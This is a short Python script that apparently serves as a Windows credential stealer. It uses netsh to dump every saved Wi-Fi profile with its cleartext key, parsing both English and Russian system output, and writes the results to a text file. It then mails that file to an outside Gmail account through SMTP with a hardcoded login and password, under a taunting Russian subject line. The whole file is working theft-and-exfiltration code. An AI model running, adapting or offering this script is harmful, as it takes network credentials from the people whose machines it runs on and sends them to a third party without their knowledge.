import subprocess
import smtplib
import os
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

def extract_wifi_passwords():
    

    profiles_data = subprocess.check_output(
        'netsh wlan show profiles').decode('CP866').split('\n')
    profiles = [i.split(':')[1].strip()
                for i in profiles_data if 'All User Profile' in i or 'Все профили пользователей' in i]

    for profile in profiles:
        try:
            profile_info = subprocess.check_output(
                f'netsh wlan show profile {profile} key=clear').decode('CP866').split('\n')
        except:
            profile_info = ''

        try:
            password = [i.split(':')[1].strip() for i in profile_info if 'Key Content' in i or 'Содержимое ключа' in i][
                0]
        except IndexError:
            password = None

        with open(file='wifi_passwords.txt', mode='a', encoding='CP866') as file:
            file.write(f'Profile: {profile}\nPassword: {password}\n{"#" * 20}\n')
def send_message():
    filepath = "wifi_passwords.txt"
    basename = os.path.basename(filepath)
    filesize = os.path.getsize(filepath)

    server1 = 'smtp.gmail.com'
    sender="foxypasswor@gmail.com"
    password="Foxy12345pas"
    subject = 'А ТЫ ХОРОШ'
    text='ТЕБЯ НЕ ПОЙМАЛИ?'

    msg = MIMEMultipart('alternative')
    msg['Subject'] = subject
    msg['To'] =sender
    part_text = MIMEText(text, 'plain')
    part_file = MIMEBase('application', 'octet-stream; name="{}"'.format(basename))
    part_file.set_payload(open(filepath, "rb").read())
    part_file.add_header('Content-Description', basename)
    part_file.add_header('Content-Disposition', 'attachment; filename="{}"; size={}'.format(basename, filesize))
    encoders.encode_base64(part_file)
    msg.attach(part_text)
    msg.attach(part_file)

    server = smtplib.SMTP_SSL(server1)
    server.login(sender,password)
    server.sendmail(sender, sender, msg.as_string())
    server.quit()

def main():
    extract_wifi_passwords()
    send_message()
if __name__ == '__main__':
    main()
